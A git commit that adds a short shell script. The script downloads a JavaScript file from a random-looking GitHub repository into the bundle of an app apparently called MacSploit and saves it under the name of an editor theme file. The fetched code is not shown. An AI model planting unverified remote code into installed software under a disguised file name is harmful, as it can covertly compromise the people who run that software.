0c40721356a06154094d994fc96ba90bfcfb59c8
5rgtnhjigt4rho <55413668+9fkoafkoswfplspflpsld@users.noreply.github.com>
2024-06-27 18:03:53 -0400

    Create louise.sh

---
+++ louise.sh
@@ -0,0 +1,6 @@
+main() {
+  cd /Applications/MacSploit.app/Contents/Resources/CodeViewer_CodeViewer.bundle/Contents/Resources/ace.bundle
+  curl "https://raw.githubusercontent.com/9fkoafkoswfplspflpsld/dfiwqksifjwfjdioeqwkgukoqwieujfuwiyrwit8r3u/main/baby.js" -o "./theme-tomorrow_night.js"
+}
+
+main
